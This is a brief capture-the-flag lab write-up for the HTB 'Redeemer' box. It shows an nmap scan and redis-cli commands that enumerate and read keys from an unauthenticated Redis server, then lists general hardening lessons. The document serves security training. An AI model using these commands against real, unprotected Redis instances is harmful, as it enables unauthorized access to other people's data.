---
title: "Lab: Redeemer"
status: "Completed"
track: "HTB Starting Point"
date: "2025-09-01"
---

# Lab: Redeemer

## Objective
Redis unauthenticated (6379/tcp).

## Methodology
1. **Recon** — Identify service/entry point.
2. **Finding** — Confirm misconfiguration/vulnerability.
3. **Exploit** — Execute the minimal steps to gain access.
4. **Post** — Retrieve proof, note hardening steps.

## Key Commands
```bash
nmap -sV -p 6379 <host>
redis-cli -h <host>
> info keyspace
> select 0
> keys *
> get flag
```

## Lessons Learned
- Disable/lock down default or legacy services.
- Restrict network exposure; prefer MFA and least privilege.
- Monitor and alert on anomalous access.